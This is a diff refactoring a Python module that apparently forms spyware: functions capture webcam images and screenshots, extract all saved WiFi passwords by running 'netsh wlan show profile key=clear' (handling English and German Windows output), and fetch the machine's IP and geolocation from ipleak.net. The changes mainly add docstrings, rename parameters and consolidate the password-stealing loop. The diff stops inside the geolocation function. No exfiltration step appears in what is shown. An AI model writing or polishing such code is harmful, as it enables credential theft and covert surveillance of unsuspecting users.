@@ -1,9 +1,12 @@
 import cv2, subprocess, requests, json # type:ignore
 from PIL import ImageGrab
-from urllib.request import Request, urlopen
 
-def take_image(path:str) -> None:
-    """Takes an image with the webcam."""
+def take_image(file_path: str) -> None:
+    """
+    Takes an image with the webcam.
+    
+    :param path (str): The path of the image file.
+    """
 
     # Open the default camera (usually the first one)
     cap = cv2.VideoCapture(0)
@@ -22,21 +25,28 @@ def take_image(path:str) -> None:
     cap.release()
     
     # Write the captured frame to a file
-    cv2.imwrite(path, frame)
+    cv2.imwrite(file_path, frame)
 
 def capture(
-        path: str = "",
-        bbox = None,
-        all_screens: bool = True,
-        include_layered_windows: bool = False,
-        xdisplay = None
+        path: str,
+        allScreens: bool = True,
+        includeLayeredWindows: bool = False
 ) -> None:
-    """Takes a screenshot of the current screen."""
+    """
+    Takes a screenshot of the current screen.
+    
+    :param path (str): Path of the image file.
+    :param allScreens (bool): If True, captures all screens. Otherwise, captures the primary screen.
+    :param includeLayeredWindows (bool): If True, captures windows that are layered.
+    :return (None):
+    """
+    bbox = None
+    xdisplay = None
 
     image = ImageGrab.grab(
         bbox=bbox,
-        all_screens=all_screens,
-        include_layered_windows=include_layered_windows,
+        all_screens=allScreens,
+        include_layered_windows=includeLayeredWindows,
         xdisplay=xdisplay
     )
     image.save(path)
@@ -44,63 +54,75 @@ def capture(
 
 def get_wifi_pwds() -> dict[str, str]:
     """
-    Gets all saved WiFi passwords.\n
-    Returns a dictionary with the WiFi names as keys and their passwords as values.
+    Gets all saved WiFi passwords.
+    
+    :return (dict[str, str]): A dictionary with the WiFi names as keys and their passwords as values.
     """
+    wifiPasswords: dict[str, str] = {}
 
-    wifi_passwords: dict[str, str] = {}
+    def _get_wifi_pwds(word1: str, word2: str) -> None:
+        for profile in profiles:
+            if word1 in profile:
+                profileName = profile.split(":")[1].strip()
+                try:
+                    output = subprocess.check_output(f'netsh wlan show profile "{profileName}" key=clear', shell=True).decode('cp850').split('\n')
+                except subprocess.CalledProcessError:
+                    continue
+
+                for line in output:
+                    if word2 in line:
+                        password = line.split(":")[1].strip()
+                        wifiPasswords[profileName] = password
+                        break
 
     try:
         profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('cp850').split('\n')
     except:
         pass
 
-    try:
-        for profile in profiles:
-            if "All User Profile" in profile:
-                profile_name = profile.split(":")[1].strip()
-                try:
-                    output = subprocess.check_output(f'netsh wlan show profile "{profile_name}" key=clear', shell=True).decode('cp850').split('\n')
-                except subprocess.CalledProcessError as e:
-                    continue
+    # Check with english and german output
+    _get_wifi_pwds("All User Profile", "Key Content")
+    _get_wifi_pwds("Profil für alle Benutzer", "Schlüsselinhalt")
 
-                for line in output:
-                    if "Key Content" in line:
-                        password = line.split(":")[1].strip()
-                        wifi_passwords[profile_name] = password
-                        break
-    except:
-        pass
-
-    try:
-        for profile in profiles:
-            if "Profil für alle Benutzer" in profile:
-                profile_name = profile.split(":")[1].strip()
-                try:
-                    output = subprocess.check_output(f'netsh wlan show profile "{profile_name}" key=clear', shell=True).decode('cp850').split('\n')
-                except subprocess.CalledProcessError as e:
-                    #print_d(alert, e)
-                    continue
-
-                for line in output:
-                    if "Schlüsselinhalt" in line:
-                        password = line.split(":")[1].strip()
-                        wifi_passwords[profile_name] = password
-                        break
-    except:
-        pass
-
-    # Writing the passwords to the file
     try:
         pwds: dict[str, str] = {}
-        for profile, password in wifi_passwords.items():
+        for profile, password in wifiPasswords.items():
             pwds[profile] = password
-    except Exception as e:
+    except Exception:
         raise Exception("The passwords couldn't be formatted!")
     
     return pwds
 
 def leak_all() -> dict[str, str]:
+    """
+    Gets the data from ipleak.net.
+    
+    :return (dict[str, str]): The following names as keys.
+
+        as_number,
+        isp_name,
+        country_code,
+        country,
+        region_code,
+        region_name,
+        continent_code,
+        continent_name,
+        city_name,
+        postal_code,
+        postal_confidence,
+        latitude,
+        longitude,
+        accuracy_radius,
+        time_zone,
+        metro_code,
+        level,
+        cache,
+        ip,
+        reverse,
+        query_text,
+        query_type,
+        query_date
+    """
     # Define the variables from ipleak
     r = requests.get('https://ipleak.net/json/')
     web_data: dict[str, str] = json.loads(r.text)  # Convert the text to JSON format
